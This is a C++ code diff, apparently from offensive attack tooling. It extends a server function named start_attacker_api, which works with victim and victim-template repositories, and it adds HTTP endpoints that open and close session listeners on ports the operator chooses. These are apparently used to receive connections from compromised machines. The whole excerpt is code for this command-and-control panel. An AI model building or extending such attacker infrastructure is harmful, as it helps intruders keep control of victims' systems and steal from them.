@@ -3,6 +3,7 @@
 #include <SQLiteCpp/SQLiteCpp.h>
 
 #include <cstdint>
+#include <exception>
 #include <iostream>
 #include <print>
 #include <thread>
@@ -11,6 +12,7 @@
 #include <VictimRepository.hpp>
 #include "HttpUtils.hpp"
 #include "Logger.hpp"
+#include "SessionManager.hpp"
 #include "Types.hpp"
 #include "Config.hpp"
 #include "VictimTemplateRepository.hpp"
@@ -264,9 +266,36 @@ void start_attacker_api(int16_t port) {
     }
 
     // basic auth test endpoint
-    attacker_api.get("/auth", [](const HttpRequest& req) {
+    attacker_api.get("/auth", [](const HttpRequest& req) -> HttpResponse {
         (void) req;
         return HttpResponse().set_json(R"(true)");
+    });
+
+    // Session endpoints
+    SessionManager sessionMan;
+
+    attacker_api.get("/open_session", [&sessionMan](const HttpRequest& req) -> HttpResponse {
+        try{
+            const auto port = std::atoi(req.query_params.at("port").c_str());
+            sessionMan.start_listener(port);
+            logger::success("New Session opened on Port: {}", port);
+            return HttpResponse().set_json(R"({ status: "Session started!" })");
+        } catch (const std::exception e) {
+            logger::error(e.what());
+            return HttpResponse().set_status(500);
+        }
+    });
+
+    attacker_api.get("/close_session", [&sessionMan](const HttpRequest& req) {
+        try{
+            const auto port = std::atoi(req.query_params.at("port").c_str());
+            sessionMan.stop_listener(port);
+            logger::success("Sessions Closed on Port: {}", port);
+            return HttpResponse().set_json(R"({ status: "Session closed!" })");
+        } catch (const std::exception e) {
+            logger::error(e.what());
+            return HttpResponse().set_status(500);
+        }
     });
 
     register_attacker_endpoints(attacker_api);
